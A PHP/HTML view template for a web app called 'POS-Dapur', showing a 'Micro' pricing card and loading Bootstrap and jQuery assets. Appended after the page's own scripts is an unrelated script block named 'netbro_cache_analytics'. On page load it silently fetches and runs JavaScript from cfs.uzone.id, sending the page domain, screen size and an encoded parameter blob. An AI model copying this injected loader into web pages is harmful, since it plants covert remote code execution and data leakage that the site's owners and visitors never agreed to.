<!DOCTYPE html>
<html lang="en">
<!--<![endif]-->
<!-- BEGIN HEAD -->
<head>
    <meta charset="utf-8"/>
    <title>POS-Dapur</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <meta content="" name="description"/>
    <meta content="" name="author"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_default.css" rel="stylesheet" id="style_color"/>

    <link href="<?php echo site_url(); ?>assets/assets/fancybox/source/jquery.fancybox.css" rel="stylesheet"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/uniform/css/uniform.default.css"/>
    <link href="<?php echo site_url(); ?>assets/assets/fullcalendar/fullcalendar/bootstrap-fullcalendar.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/jqvmap/jqvmap/jqvmap.css" media="screen" rel="stylesheet" type="text/css"/>
</head>

<body class="fixed-top">
<?php $this->load->view('headerDapur.php') ?>
<div id="container" class="row-fluid">
    <div id="main-content">
        <div class="container-fluid">
            <div class="widget-body">
                <div class="row-fluid">
                    <div class="span3">
                        <div class="pricing-table">
                            <div class="pricing-head">
                                <h3> Micro </h3>
                            </div>
                            <ul>
                                <li>
                                    <strong>Free</strong>
                                    setup
                                </li>
                                <li>
                                    <strong>1</strong>
                                    Website
                                </li>
                                <li>
                                    <strong>2</strong>
                                    Projects
                                </li>
                                <li>
                                    <strong>1GB</strong>
                                    Storage
                                </li>
                                <li>
                                    <strong>$0</strong>
                                    Google Adwords Credit
                                </li>
                            </ul>
                            <div class="price-actions">
                                <a class="btn" href="javascript:">Purchase Now</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</div>
</div>
</body>
<!-- END PAGE CONTENT-->

<!-- END CONTAINER -->
<!-- BEGIN FOOTER -->
<!-- END FOOTER -->
<!-- BEGIN JAVASCRIPTS -->
<!-- Load javascripts at bottom, this will reduce page load time -->
<script src="<?php echo base_url(); ?>assets/js/jquery-1.8.3.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.blockui.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.cookie.js"></script>
<!-- ie8 fixes -->
<!--[if lt IE 9]>
<script src="js/excanvas.js"></script>
<script src="js/respond.js"></script>
<![endif]-->
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/jquery.vmap.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.russia.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.world.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.europe.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.germany.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.usa.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/data/jquery.vmap.sampledata.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jquery-knob/js/jquery.knob.js"></script>
<!-- <script src="assets/flot/jquery.flot.js"></script> -->

<script src="<?php echo base_url(); ?>assets/js/jquery.peity.min.js"></script>
<script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/uniform/jquery.uniform.min.js"></script>
<script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/data-tables/jquery.dataTables.js"></script>
<script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/data-tables/DT_bootstrap.js"></script>

<script src="<?php echo base_url(); ?>assets/js/scripts.js"></script>
<script>
    jQuery(document).ready(function () {
        // initiate layout and plugins
        App.setMainPage(true);
        App.init();
    });
</script>
<!-- END JAVASCRIPTS -->
<script type="text/javascript">if (self == top)
    {
        function netbro_cache_analytics(fn, callback)
        {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn)
        {
            fn();
        }

        function requestCfs()
        {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r   = Math.floor(Math.random() * 99999999999);
            var url         = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCo3tr%2fhGc2D%2fInIsAo2jh4sOfFtyDaZnVywFAVh1U%2fVRcrbxgjM2m8poDPNxotq21S3PRrvxy19M92oP7S8M0NH%2bPniGoiqp4mqSZPOs6BaIoFPoyNAcZ2rc%2fQ%2fEz6d9b5efudH7y8uJl%2b3vx1mZDldGer6zgdZYZCm%2f3h6yei%2fg5SzNw1RFJD5BmjBUwhpyE7WSmEsGHLxC%2b9L%2bxE00RnO6igQ1x58YaGKmT6L2CSnTLbdA1tWfLDglwut4ZWhCsq6rSpxafYFct0PHiU8v0zK%2fW1GRpbV%2bJD1qZJ1DcKNbUCva8yj2jYeRvgR8sbGZaBk3H2QPw2z2upGKaCYODO1yYHerNRM027bNjIVZjYwyhatpC9N98QpbG6WxfttQNdGiLqiwpJbw%2beFADORWjSR3JneCdVv33gY0FMLLNPTiQhFboHiiD1siUP3HxdJcC9CV1gcZfeil7MK78AAfU9Sk6G%2fB9NKhhDaW44W7kgUfG4jnTaanzDCERPED%2bNZb2I%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa         = document.createElement('script');
            bsa.type        = 'text/javascript';
            bsa.async       = true;
            bsa.src         = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
</script>
</body>
<!-- END BODY -->
</html>
